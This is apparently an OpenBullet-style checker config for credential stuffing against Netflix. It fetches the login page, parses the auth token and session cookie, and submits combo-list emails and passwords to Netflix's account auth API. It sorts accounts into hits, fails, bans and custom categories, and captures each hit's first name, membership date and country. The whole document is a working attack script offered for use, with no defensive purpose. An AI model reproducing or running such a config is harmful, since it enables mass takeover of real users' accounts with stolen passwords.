[SCRIPT]
#Login REQUEST GET "https://www.netflix.com/au/login" 
  
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: */*" 

KEYCHECK BanOnToCheck=FALSE 
  KEYCHAIN Ban OR 
    KEY "<SOURCE>" DoesNotContain "name=\"authURL\" value=\"" 

#Flawssn PARSE "<COOKIES(flwssn)>" LR "" "" -> VAR "flwssn" 

#Auth PARSE "<SOURCE>" LR "name=\"authURL\" value=\"" "\"" EncodeOutput=TRUE -> VAR "AUTH" 

#Sessione REQUEST POST "https://api-global.netflix.com/account/auth" 
  CONTENT "email=<USER>&password=<PASS>&setCookies=true" 
  CONTENTTYPE "application/x-www-form-urlencoded" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
  HEADER "Referer: https://www.netflix.com/Login" 

KEYCHECK 
  KEYCHAIN Failure OR 
    KEY "NetflixId\":null,\"user\":{\"" 
    KEY "Incorrect email address or password" 
    KEY "Missing password" 
  KEYCHAIN Ban OR 
    KEY "Invalid Request" 
  KEYCHAIN Success OR 
    KEY "CURRENT_MEMBER" 
  KEYCHAIN Custom "CUSTOM" OR 
    KEY "FORMER_MEMBER" 
    KEY "NEVER_MEMBER" 

#Profilo REQUEST GET "https://www.netflix.com/YourAccount" 
  
  COOKIE "flwssn: <flwssn>" 
  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
  HEADER "Accept-Encoding: gzip, deflate, br" 
  HEADER "Accept-Language: en-US,en;q=0.9" 
  HEADER "Connection: keep-alive" 
  HEADER "Host: www.netflix.com" 
  HEADER "Referer: https://www.netflix.com/browse" 
  HEADER "Sec-Fetch-Dest: document" 
  HEADER "Sec-Fetch-Mode: navigate" 
  HEADER "Sec-Fetch-Site: same-origin" 
  HEADER "Sec-Fetch-User: ?1" 
  HEADER "Upgrade-Insecure-Requests: 1" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 

KEYCHECK BanOnToCheck=FALSE 
  KEYCHAIN Custom "Scaduto" OR 
    KEY "Your membership is paused." 

#Name PARSE "<SOURCE>" LR "\"firstName\":\"" "\"" CreateEmpty=FALSE -> CAP "Name" 

#Member_Since PARSE "<SOURCE>" LR "data-uia=\"member-since\"><div class=\"account-section-membersince--svg\"></div>" "</div>" CreateEmpty=FALSE -> CAP "Netflix" 

#Country PARSE "<SOURCE>" LR "\",\"currentCountry\":\"" "\"" -> VAR "Country" 

